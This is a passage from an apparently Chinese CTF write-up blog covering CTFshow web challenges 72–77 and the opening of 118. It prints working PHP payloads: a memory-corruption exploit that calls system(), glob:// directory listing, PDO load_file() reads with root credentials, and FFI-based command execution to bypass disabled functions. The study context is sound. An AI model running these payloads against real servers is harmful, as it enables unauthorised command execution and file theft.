class="line"></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码，带着空格和换行符</span></span><br></pre></td></tr></table></figure>

<p>globx协议:查找匹配的文件路径模式<img src="/2022/03/11/CTFshow2/image-20220220154722677-164701005467516.png" alt="image-20220220154722677"></p>
<h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"> printf(<span class="variable">$f</span>-&gt;getFilename().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">都可，在flagc.txt里面</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagx.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在flag36.txt</p>
<p>include 无法使用，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;<span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;echo(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = null;&#125;catch (PDOException <span class="variable">$e</span>) &#123;echo <span class="variable">$e</span>- &gt;getMessage();**<span class="keyword">exit</span>**(<span class="number">0</span>);&#125;**<span class="keyword">exit</span>**(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<p>在<strong>PDO</strong>中，我们可以使用三种方式来执行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>，分别是 exec()方法，query方法，以及预处理语句prepare()和execute()方法</p>
<p><img src="/2022/03/11/CTFshow2/image-20220220163455540-164701005467517.png" alt="image-20220220163455540"></p>
<p>exec()方法返回执行SQL 语句后受影响的行数，其语法格式如下：</p>
<p>参数 satatement 是要执行的SQL语句，该方法返回执行SQL 语句时受影响的行数，通常用于 INSERT，DELETE和UPDATE语句中</p>
<p>query()方法用于返回执行查询后的结果集，该函数的语法格式如下如下：</p>
<p>参数 satatement 是要执行的 SQL语句，它返回的是一个PODStatement对象！</p>
<p>注意:</p>
<p>1、query和exec都可以执行所有的sql语句，只是返回值不同而已。</p>
<p>2、query可以实现所有exec的功能。</p>
<p>3、当把select语句应用到 exec 时，总是返回 0</p>
<p>4、如果要看查询的具体结果，可以通过foreach语句完成循环输出</p>
<p>第三种种方法：预处理语句：prepare()语句和execute()语句</p>
<p>预处理语句包括prepare()和execute()两种方法。首先，通过prepare()方法做查询准备工作，然后通过execute()方法执行查询，并且还可以通过bindParam()方法来绑定参数给execute()方法</p>
<p><strong>php中的“-&gt;”符号</strong>被称为箭头<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符</a>，箭头运算符左侧是获取类的实例，右侧将指定左侧类的方法和属性并进行<strong>调用</strong></p>
<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在flag36d.txt</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;<span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;echo(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = null;&#125;catch (PDOException <span class="variable">$e</span>) &#123;echo <span class="variable">$e</span> -&gt; getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>使用上面的方法得到<img src="/2022/03/11/CTFshow2/image-20220220190908376-164701005467518.png" alt="image-20220220190908376"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>读取目录：flag36x.txt是上面图片的内容，还有一个readflag文件</p>
<p><img src="/2022/03/11/CTFshow2/image-20220220190951090-164701005467519.png" alt="image-20220220190951090"></p>
<p>还是常使用POD读取flag36x.php但是失败了，根据提示使用PHP7.4以上才有的FFI进行命令执行</p>
<p>readflag是专门用来读flag的。然后访问<code>/1.txt</code>即可。</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/11/CTFshow2/image-20220220192653988-164701005467520.png" alt="image-20220220192653988"></p>
<p>system函数：<br>原型：int system(const char * command)；<br>功能：执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名;<br>说明：在windows系统中，system函数直接在控制台调用一个command命令。在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程；</p>
<p><strong>FFI</strong></p>
<p>外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 </p>
<p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133809650">https://zhuanlan.zhihu.com/p/133809650</a></p>
<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p><img src="/2022/03/11/CTFshow2/image-20220220194519359-164701005467521.png" alt="image-20220220194519359"></p>
<p><img src="/2022/03/11/CTFshow2/image-20220220194703989-164701005467522.png" alt="image-20220220194703989"></p>
<p>也就是我们输入的命令会被执行，但是诸如<code>ls</code>，<code>id</code>之类的都被ban了</p>
<p>大写字母没被过滤</p>
<p>首先给我们了两个hint点</p>
<p>hint1：<img src="/2022/03/11/CTFshow2/image-20220220201703149-164701005467523.png" alt="image-20220220201703149"></p>
<p>hint2：为两个payload</p>
<pre><code>$&#123;PATH:$
</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CJ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Symbols count total">492k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">7:28</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  





  





</body>
</html>
